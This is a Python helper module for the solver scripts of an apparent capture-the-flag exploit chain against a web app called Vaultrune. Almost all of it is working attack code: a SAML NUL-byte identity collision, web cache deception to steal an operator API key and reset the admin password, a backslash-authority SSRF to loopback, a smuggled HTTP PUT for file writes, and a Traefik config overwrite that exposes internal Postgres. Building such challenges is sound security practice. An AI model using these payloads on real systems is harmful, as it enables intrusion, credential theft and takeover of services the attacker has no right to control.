#!/usr/bin/env python3
"""
Shared helpers for the Vaultrune / ca_insane step-by-step solver scripts.

The full end-to-end exploit lives in `solve.py` (+ `poc.py`). These helpers mirror
its building blocks so each link of the SIX-stage chain can be driven by hand:

  S1  SAML NUL differential            -> CLERK   (sso_login + decode_role)
  S2  Web Cache Deception via the bot  -> ADMIN   (file_reference + steal_api_key
                                                   + reset_and_login)
  S3  Courier SSRF                                (courier + inner_url)
  S4  HTTP/1 smuggling -> file write              (smuggled_write)
  S5  Traefik dynamic.yml overwrite              (PG_DYNAMIC_YML)
  S6  pgcrypto CVE-2026-2005 -> RCE              (see poc.py)

State passing between steps
---------------------------
Stage 1 writes the CLERK session cookie to a file (default `session.cookie`); the
Stage-2 WCD step uses it to file the disguised reference and then writes back the
ADMIN session cookie (after the sealing key reset + operator login). Stages 3+ read
that admin cookie. Pass `--cookie 'registry_session=...'` to override.
"""
import base64
import json
import http.client
import re
import secrets
import sys
import time
import urllib.parse
from html.parser import HTMLParser
from pathlib import Path

import requests

# --- reserved identity + the NUL-bearing variant that collides under libxml2 ---
HS = "warrant-clerk@vaultrune.valyssar.local"
NUL_SUBJECT = HS + "\x00x"          # requests url-encodes the 0x00 to %00 on the wire
SIGNUP_PASSWORD = "pw1234"
OPERATOR = "warden"                 # the local operator (admin) account name

# default file used to hand the session cookie from one step to the next
DEFAULT_COOKIE_FILE = Path(__file__).resolve().parent / "session.cookie"

# Traefik TCP catch-all: when this overwrites /etc/traefik/dynamic.yml the file
# provider (watch:true) hot-reloads and the public entrypoint carries raw TCP to
# the internal Postgres (one-shot — it replaces the HTTP routers). (Stage 5.)
PG_DYNAMIC_YML = (
    'tcp:\n'
    '  routers:\n'
    '    pg:\n'
    '      rule: "HostSNI(`*`)"\n'
    '      entryPoints: ["web"]\n'
    '      service: pg\n'
    '  services:\n'
    '    pg:\n'
    '      loadBalancer:\n'
    '        servers:\n'
    '          - address: "127.0.0.1:5432"\n'
)


def log(stage, msg):
    print(f"  [{stage}] {msg}", flush=True)


# ---------------------------------------------------------------------------
# HTML form parsing — used by stage 1 to drive the SimpleSAMLphp login form.
# ---------------------------------------------------------------------------
class _FormParser(HTMLParser):
    """Collect every <form> with its action/method and all <input> name=value."""

    def __init__(self):
        super().__init__()
        self.forms = []
        self._cur = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._cur = {"action": a.get("action", ""),
                         "method": (a.get("method", "get") or "get").lower(),
                         "inputs": {}}
        elif tag == "input" and self._cur is not None:
            name = a.get("name")
            if name is not None:
                self._cur["inputs"][name] = a.get("value", "")

    def handle_endtag(self, tag):
        if tag == "form" and self._cur is not None:
            self.forms.append(self._cur)
            self._cur = None


def parse_forms(html):
    p = _FormParser()
    p.feed(html)
    if p._cur is not None:          # tolerate an unclosed <form>
        p.forms.append(p._cur)
    return p.forms


def pick_login_form(html):
    """Return (inputs, action) of the SimpleSAMLphp username/password form."""
    for f in parse_forms(html):
        keys = {k.lower() for k in f["inputs"]}
        if "username" in keys or "password" in keys or "AuthState" in f["inputs"]:
            return f["inputs"], f["action"]
    forms = parse_forms(html)
    if forms:
        return forms[0]["inputs"], forms[0]["action"]
    return None, None


# ---------------------------------------------------------------------------
# Cookie persistence — hand the session cookie from one step to the next.
# ---------------------------------------------------------------------------
def save_cookie(cookie, path=None):
    p = Path(path) if path else DEFAULT_COOKIE_FILE
    p.write_text(cookie)
    return p


def load_cookie(cookie=None, path=None):
    if cookie:
        return cookie
    p = Path(path) if path else DEFAULT_COOKIE_FILE
    if not p.exists():
        sys.exit(f"[!] no --cookie given and {p} not found; run the earlier step first "
                 f"(or pass --cookie 'registry_session=...').")
    val = p.read_text().strip()
    if not val:
        sys.exit(f"[!] {p} is empty; re-run the earlier step.")
    return val


def decode_role(cookie):
    """Decode the registry_session payload to read its role (no signature check)."""
    try:
        value = urllib.parse.unquote(cookie.split("=", 1)[1])
        enc = value.split(".", 1)[0]
        payload = json.loads(base64.urlsafe_b64decode(enc + "=" * (-len(enc) % 4)))
        return payload.get("role")
    except Exception:
        return None


def raw_request(base, path, cookie=None, method="GET"):
    """Send a request with the path VERBATIM (no ../ collapse, no %2f decode), as
    `curl --path-as-is` would. putrequest supplies the Host header — do not add a
    second one or the edge rejects the duplicate with 400. Returns (status, body)."""
    u = urllib.parse.urlsplit(base)
    conn = http.client.HTTPConnection(u.hostname, u.port or 80, timeout=20)
    try:
        conn.putrequest(method, path, skip_accept_encoding=True)
        if cookie:
            conn.putheader("Cookie", cookie)
        conn.endheaders()
        resp = conn.getresponse()
        return resp.status, resp.read().decode("utf-8", "replace")
    finally:
        conn.close()


# ---------------------------------------------------------------------------
# Stage 1 — SAML NUL differential -> CLERK.
# ---------------------------------------------------------------------------
def sso_login(base, sess, username, password):
    """Sign up + SP-initiated SSO as `username`; return the registry_session cookie."""
    sess.post(base + "/signup",
              data={"email": username, "displayName": "Petitioner", "password": password},
              allow_redirects=True, timeout=20)
    r0 = sess.get(base + "/login", allow_redirects=False, timeout=20)
    loc = r0.headers.get("location", "")
    if not loc:
        sys.exit("  [S1] FAIL: /login did not redirect to the Signet IdP")
    if loc.startswith("/"):
        loc = base + loc
    page = sess.get(loc, allow_redirects=True, timeout=20)
    inputs, action = pick_login_form(page.text)
    if inputs is None:
        sys.exit("  [S1] FAIL: could not locate the Signet login form")
    action_url = urllib.parse.urljoin(page.url, action) if action else page.url
    form = dict(inputs)
    form["username"] = username
    form["password"] = password
    r = sess.post(action_url, data=form, allow_redirects=True, timeout=20)
    m = re.search(r'name="SAMLResponse" value="([^"]+)"', r.text)
    if not m:
        sys.exit("  [S1] FAIL: the Signet returned no signed SAMLResponse (auth failed?)")
    relay = re.search(r'name="RelayState" value="([^"]*)"', r.text)
    relay = relay.group(1) if relay else "/registry"
    r = sess.post(base + "/saml/acs",
                  data={"SAMLResponse": m.group(1), "RelayState": relay or "/registry"},
                  allow_redirects=False, timeout=20)
    cookie = (r.headers.get("set-cookie") or "").split(";")[0]
    if not cookie:
        sys.exit("  [S1] FAIL: ACS set no session cookie")
    return cookie


# ---------------------------------------------------------------------------
# Stage 2 — Web Cache Deception -> ADMIN.
# ---------------------------------------------------------------------------
def file_reference(base, clerk_cookie):
    """File a uniquely-named disguised reference into the Warden's review queue and
    return the reference path (unique filename avoids self-poisoning the cache)."""
    ref = f"/static/wcd-{secrets.token_hex(6)}.css/..%2f..%2fadmin/account"
    requests.post(base + "/appeals", headers={"cookie": clerk_cookie},
                  data={"reference": ref}, allow_redirects=True, timeout=20)
    return ref


def steal_api_key(base, clerk_cookie, attempts=8):
    """File disguised references and, once the bot has reviewed one (so the
    authenticated /admin/account is in the shared cache), read that cache entry
    UNAUTHENTICATED and return the leaked operator sealing key (or None)."""
    sess = requests.Session()
    for attempt in range(1, attempts + 1):
        ref = file_reference(base, clerk_cookie)
        for _ in range(20):
            time.sleep(2)
            page = sess.get(base + "/appeals", headers={"cookie": clerk_cookie}, timeout=20).text
            row = re.search(re.escape(ref) + r'[\s\S]*?data-status="(\w+)"', page)
            if row and row.group(1) == "reviewed":
                _, body = raw_request(base, ref)              # UNAUTH read of the cache
                km = re.search(r'data-api-key="([^"]+)"', body)
                if km:
                    return km.group(1)
                break
        log("S2", f"attempt {attempt}: cache not populated yet, retrying with a fresh key")
    return None


def reset_and_login(base, api_key, new_password=None):
    """Use the over-scoped sealing key to reset the operator password, then log in to
    the local operator console -> admin registry_session cookie."""
    new_password = new_password or secrets.token_hex(12)
    rr = requests.post(base + "/api/account/reset-password",
                       headers={"content-type": "application/json"},
                       data=json.dumps({"api_key": api_key, "new_password": new_password}),
                       timeout=20)
    if rr.status_code != 200:
        sys.exit(f"  [S2] FAIL: reset-password returned {rr.status_code}: {rr.text[:200]}")
    lr = requests.post(base + "/admin/login",
                       data={"username": OPERATOR, "password": new_password},
                       allow_redirects=False, timeout=20)
    cookie = (lr.headers.get("set-cookie") or "").split(";")[0]
    if "registry_session" not in cookie or decode_role(cookie) != "admin":
        sys.exit("  [S2] FAIL: operator login did not yield an admin session")
    return cookie


# ---------------------------------------------------------------------------
# Stage 3 / Stage 4 — the admin-only courier egress: SSRF then the smuggled write.
# POST-only; redirects disabled.
# ---------------------------------------------------------------------------
def courier(base, cookie, address, headers=None, body=None, timeout=15):
    payload = {"address": address}
    if headers is not None:
        payload["headers"] = headers
    if body is not None:
        payload["body"] = body
    return requests.post(base + "/admin/courier",
                         headers={"cookie": cookie, "content-type": "application/json"},
                         data=json.dumps(payload), allow_redirects=False, timeout=timeout)


def inner_url(inner_port, decoy, path):
    """Build the courier SSRF address for the loopback Inner Ward (Stage 3).

    Backslash-in-authority parser differential: the filter reads urlsplit().hostname
    (the public decoy, which passes the routable-address check) while requests/urllib3
    terminate the authority at the backslash, connect to 127.0.0.1:<port>, and collapse
    the `/../` dot-segment so the wire request line is `<METHOD> /<path>`."""
    return f"http://127.0.0.1:{inner_port}\\@{decoy}/../{path}"


def smuggled_write(path, content):
    """The second (smuggled) request: a PUT /records/write the POST-only courier can
    never issue directly (Stage 4). Carried in the courier's JSON `body` channel; oatpp
    parses it as request #2 once the space-in-name header drops Content-Length."""
    inner = json.dumps({"path": path, "data": base64.b64encode(content.encode()).decode()})
    return ("PUT /records/write HTTP/1.1\r\nHost: innerward\r\n"
            "Content-Type: application/json\r\n"
            f"Content-Length: {len(inner)}\r\n\r\n" + inner)
